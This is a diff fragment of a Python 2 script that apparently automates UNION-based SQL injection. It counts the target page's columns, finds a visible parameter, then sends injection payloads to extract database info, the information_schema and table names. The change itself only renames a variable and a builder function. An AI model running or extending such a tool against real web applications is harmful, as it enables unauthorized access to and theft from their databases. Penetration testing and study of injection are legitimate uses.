@@ -38,22 +38,22 @@ if __name__ == '__main__':
         6) grab selected col. info
     """
 
-    # Get number of columns
+    # Get column data
     print '\n### Basic Page Structure ###'
     num_columns = fang.get_num_columns(page) 
     report.columns_in_statement(num_columns)
-    magic = int(fang.get_visible_param(page))
-    print 'Magic Param','\t', magic
+    magic_num = int(fang.get_visible_param(page))
+    print 'Magic Param','\t', magic_num
 
     # Get data
     print '\n### Basic DB Info ###'
-    data = fang.injection(page, build.union(num_columns, magic)) 
+    data = fang.injection(page, build.union(num_columns, magic_num)) 
     report.db_info(parse.db_values(data))
-    data = fang.injection(page, build.schema_union(num_columns, magic)) 
+    data = fang.injection(page, build.schema_union(num_columns, magic_num)) 
     print parse.information_schema(data)
 
     # Get data
     print '\n### DB Table Info ###'
-    print fang.injection(page, build.user_table(num_columns, magic)) 
+    print fang.injection(page, build.tables(num_columns, magic_num)) 
 
 
